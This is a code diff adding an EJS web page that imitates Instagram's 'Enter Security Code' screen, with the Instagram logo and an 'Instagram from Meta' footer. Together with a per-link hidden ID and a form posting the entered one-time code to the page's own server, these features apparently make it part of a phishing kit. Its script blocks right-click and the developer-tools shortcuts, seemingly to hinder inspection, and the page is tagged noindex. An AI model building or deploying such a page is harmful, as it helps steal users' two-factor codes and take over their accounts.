@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Enter Security Code • Instagram</title>
+    <link rel="icon" href="/images/icons/ig.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <%- include('../partials/translate.ejs') %>
+    <div class="flex flex-col min-h-screen">
+        <!-- Main Content -->
+        <main class="flex-grow flex items-center justify-center p-4">
+            <div class="w-full max-w-sm">
+                <div class="bg-white p-8 border border-gray-300 rounded">
+                    <!-- Instagram Logo -->
+                    <div class="flex justify-center mb-8">
+                        <img src="/images/icons/ig.png" alt="Instagram" class="h-12">
+                    </div>
+
+                    <!-- Title and Description -->
+                    <div class="text-center mb-6">
+                        <h1 class="text-lg font-semibold mb-2">Enter Security Code</h1>
+                        <p class="text-sm text-gray-500">
+                            We sent a security code to your mobile phone. Enter the code to continue.
+                        </p>
+                    </div>
+                    
+                    <form method="POST" class="space-y-4" autocomplete="off">
+                        <input type="hidden" name="linkId" value="<%=  '' %>">
+                        
+                        <!-- OTP Input -->
+                        <div class="flex justify-center gap-2">
+                            <input type="text" 
+                                   name="otp" 
+                                   required
+                                   maxlength="10"
+                                   class="text-center text-lg border border-gray-300 rounded focus:outline-none focus:border-gray-400 bg-gray-50"
+                                   >
+                        </div>
+
+                        <button type="submit" 
+                                id="submitBtn"
+                                class="w-full bg-[#0095f6] text-white font-semibold py-2 rounded hover:bg-[#1877f2] transition">
+                            Submit
+                        </button>
+                    </form>
+
+                    <div class="mt-4 text-center">
+                        <button class="text-[#0095f6] text-sm font-semibold">Resend Code</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="py-4 text-center">
+            <div class="container mx-auto px-4">
+                <div class="text-xs text-gray-600">
+                    <p> Instagram from Meta</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const submitBtn = document.getElementById('submitBtn');
+        const form = document.getElementsByTagName('form')[0];
+
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            const otp = document.querySelector('input[name="otp"]').value.trim();
+            
+            if (!otp || otp.length < 4) {
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+            form.submit();
+        });
+
+        // Function to move to next input
+        function moveToNext(current, nextFieldName) {
+            if (current.value.length === 1) {
+                const nextField = document.querySelector(`input[name=${nextFieldName}]`);
+                if (nextField) {
+                    nextField.focus();
+                }
+            }
+        }
+
+        // Only allow numbers
+        document.querySelectorAll('input[type="text"]').forEach(input => {
+            input.addEventListener('keypress', (e) => {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        // Prevent form resubmission on refresh
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+
+        // Disable right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Disable developer tools shortcut
+        document.addEventListener('keydown', (e) => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
